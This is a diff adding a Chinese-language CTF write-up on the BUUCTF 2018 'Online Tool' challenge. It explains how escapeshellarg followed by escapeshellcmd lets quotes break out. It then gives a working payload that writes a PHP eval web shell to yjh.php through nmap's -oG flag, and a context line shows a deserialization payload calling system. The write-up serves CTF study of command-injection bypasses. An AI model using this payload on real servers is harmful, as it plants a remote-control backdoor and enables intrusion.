@@ -2976,6 +2976,76 @@ echo serialize($t);
 
 payload：`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat+/tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`
 
+## BUUOJ [BUUCTF 2018]Online Tool
+
+### 1. 前置知识
+
+#### 1.1 escapeshellarg 与 escapeshellcmd 原理
+
++ escapeshellarg：先将 字符串 用引号包裹，期间如果遇到 单引号，会用 \ 转义再用单引号包裹，即：`'\''`
++ escapeshellcmd：反斜线（\）会在以下字符之前插入：&#;`|*?~<>^()[]{}$\、\x0A 和 \xFF。 **' 和 " 仅在不配对儿的时候被转义**
+
+示例：
+
+```bash
+<?php
+$_GET['host'] = "127.0.0.1'";
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    echo $host."\n";						# 输出：'127.0.0.1'\'''
+    $host = escapeshellcmd($host);
+    echo $host."\n";						# 输出：'127.0.0.1'\\''\'
+}
+```
+
+如果是先使用`escapeshellarg`再使用`escapeshellcmd`函数的时候，两个函数相互叠加，相互转义，就有可能被绕过
+
+### 2. 复现
+
+```
+payload：' <?php @eval($_POST["cmd"]);?> -oG yjh.php '
+```
+
+这条payload经过转义之后，会外把外面两个单引号闭合`'`
+
+```php
+<?php
+$_GET['host'] = "' 1 '";
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    echo $host."\n";					# 输出：''\'' 1 '\'''
+    $host = escapeshellcmd($host);
+    echo $host."\n";					# 输出：''\\'' 1 '\\'''，单引号干好成对出现闭合
+}
+```
+
+对于中间部分，也会刚好有一个`\`做转义，使得一句话木马写入成功
+
+```bash
+<?php
+$_GET['host'] = '<?php @eval($_POST["cmd"]);?> -oG yjh.php';
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);			
+    echo $host."\n";							# 输出：'<?php @eval($_POST["cmd"]);?> -oG yjh.php'
+    $host = escapeshellcmd($host);
+    echo $host."\n";					# 输出：'\<\?php @eval\(\$_POST\[\"cmd\"\]\)\;\?\> -oG yjh.php'
+}
+```
+
+最后使用蚁剑连接即可！
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
